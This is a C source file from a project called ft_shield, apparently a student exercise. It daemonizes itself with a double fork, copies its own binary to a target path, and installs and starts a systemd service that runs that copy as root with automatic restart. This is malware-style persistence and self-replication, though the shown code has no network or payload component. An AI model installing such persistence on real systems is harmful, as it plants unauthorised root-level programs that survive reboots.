#include <ft_shield.h>
#include <stdio.h>

int	check_lock_file(void)
{
	int	lfd = open(LOCK_FILE, O_CREAT | O_RDWR, 0666);
	if (lfd == -1)
		return 0;
	if (flock(lfd, LOCK_EX | LOCK_NB) != 0)
	{
		close(lfd);
		return 0;
	}
	return lfd;
}

void	remove_lock_file(int fd)
{
	flock(fd, LOCK_UN);
	close(fd);
	remove(LOCK_FILE);
}

static void setup_service(void)
{
	int service_fd;
	char *service_str = 
        "[Unit]\n"
        "Description=Service for ft_shield by rorozco- and rcabezas\n"
        "[Service]\n"
        "ExecStart=/usr/bin/ft_shield\n"
        "Restart=always\n"
        "User=root\n"
        "WorkingDirectory=/\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";
	if (access(SERVICE_PATH, F_OK) != -1)
        return ;
	if ((service_fd = open(SERVICE_PATH, O_CREAT | O_WRONLY, 0644)) == -1)
		exit(EXIT_FAILURE);
	printf("HOAL\n");
	write(service_fd, service_str, strlen(service_str));
	close(service_fd);
	system("systemctl daemon-reload");
	system("systemctl enable ft_shield");
	system("systemctl start ft_shield");
}

static void replicate(void)
{
	int	origin;
	int bin_fd;
	ssize_t	len;
	char exec_path[256];
	struct stat fileinfo = {0};

	if (access(TARGET_PATH, F_OK) != -1)
        return ;
	if ((len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1)) < 0)
		exit(EXIT_FAILURE);
	exec_path[len] = '\0';
	if ((origin = open(exec_path, O_RDONLY)) == -1)
		exit(EXIT_FAILURE);
	if ((bin_fd = creat(TARGET_PATH, 0700)) == -1)
	{
		close(origin);
		exit(EXIT_FAILURE);
	}
	fstat(origin, &fileinfo);
	sendfile(bin_fd, origin, NULL, fileinfo.st_size);
	close(origin);
	close(bin_fd);
}

static void setup_process(void)
{
	pid_t   pid;

	pid = fork();
	if (pid < 0)
		exit(EXIT_FAILURE);
	if (pid > 0)
		exit(EXIT_SUCCESS);
	if (setsid() < 0)
		exit(EXIT_FAILURE);
	pid = fork();
	if (pid < 0)
		exit(EXIT_FAILURE);
	if (pid > 0)
		exit(EXIT_SUCCESS);
	umask(0);
	chdir("/");
}


void daemonize()
{
	setup_process();
	replicate();
	setup_service();
}